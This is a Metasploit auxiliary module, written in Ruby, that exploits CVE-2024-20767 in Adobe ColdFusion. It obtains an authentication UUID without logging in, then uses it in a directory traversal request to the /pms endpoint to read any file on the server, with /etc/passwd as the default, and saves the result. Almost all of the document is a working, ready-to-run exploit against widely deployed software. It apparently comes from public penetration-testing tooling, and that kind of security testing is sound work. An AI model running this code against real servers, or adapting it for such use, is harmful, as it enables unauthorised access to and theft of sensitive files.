##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'CVE-2024-20767 - Adobe Coldfusion Arbitrary File Read',
        'Description' => %q{
          This module exploits an Improper Access Vulnerability in Adobe Coldfusion versions prior to version
          '2023 Update 6' and '2021 Update 12'. The vulnerability allows unauthenticated attackers to request authentication
          token in the form of a UUID from the /CFIDE/adminapi/_servermanager/servermanager.cfc endpoint. Using that
          UUID attackers can hit the /pms endpoint in order to exploit the Arbitrary File Read Vulnerability.
        },
        'Author' => [
          'ma4ter',          # Analysis & Discovery
          'yoryio',          # PoC
          'Christiaan Beek', # Msf module
          'jheysel-r7'       # Msf module assistance
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2024-20767'],
          ['URL', 'https://helpx.adobe.com/security/products/coldfusion/apsb24-14.html'],
          ['URL', 'https://jeva.cc/2973.html'],

        ],
        'DisclosureDate' => '2024-03-12',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(8500),
        OptString.new('TARGETURI', [true, 'The base path for ColdFusion', '/']),
        OptString.new('FILE_PATH', [true, 'File path to read from the server', '/etc/passwd']),
        OptInt.new('NUMBER_OF_LINES', [true, 'Number of lines to retrieve', 10000]),
        OptInt.new('DEPTH', [true, 'Traversal Depth', 5]),
      ]
    )
  end

  def get_uuid
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'CFIDE', 'adminapi', '_servermanager', 'servermanager.cfc'),
      'vars_get' =>
       {
         'method' => 'getHeartBeat'
       }
    })
    fail_with(Failure::Unreachable, 'No response from the target when attempting to retrieve the UUID') unless res

    # TODO: give a more detailed error message once we find out why some of the seemingly vulnerable test targets return a 500 here.
    fail_with(Failure::UnexpectedReply, "Received an unexpected response code: #{res.code} when attempting to retrieve the UUID") unless res.code == 200
    uuid = res.get_html_document.xpath('//var[@name=\'uuid\']/string/text()').text
    fail_with(Failure::UnexpectedReply, 'There was no UUID in the response') unless uuid =~ /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/
    uuid
  end

  def run
    print_status('Attempting to retrieve UUID ...')
    uuid = get_uuid
    print_good("UUID found: #{uuid}")
    print_status("Attempting to exploit directory traversal to read #{datastore['FILE_PATH']}")

    traversal_path = '../' * datastore['DEPTH']
    file_path = "#{traversal_path}#{datastore['FILE_PATH']}"

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'pms'),
      'vars_get' =>
         {
           'module' => 'logging',
           'file_name' => file_path,
           'number_of_lines' => datastore['NUMBER_OF_LINES']
         },
      'headers' =>
         {
           'uuid' => uuid
         }
    })

    fail_with(Failure::Unknown, 'No response received') unless res

    if res.code == 200
      print_good('File content received:')
    else
      fail_with(Failure::UnexpectedReply, "Failed to retrieve file content, server responded with status code: #{res.code}")
    end

    file_contents = []
    res.body[1..-2].split(', ').each do |html_response_line|
      print_status(html_response_line)
      file_contents << html_response_line
    end

    stored_path = store_loot('coldfusion.file', 'text/plain', rhost, file_contents.join("\n"), datastore['FILE_PATH'])
    print_good("Results saved to: #{stored_path}")
  end
end
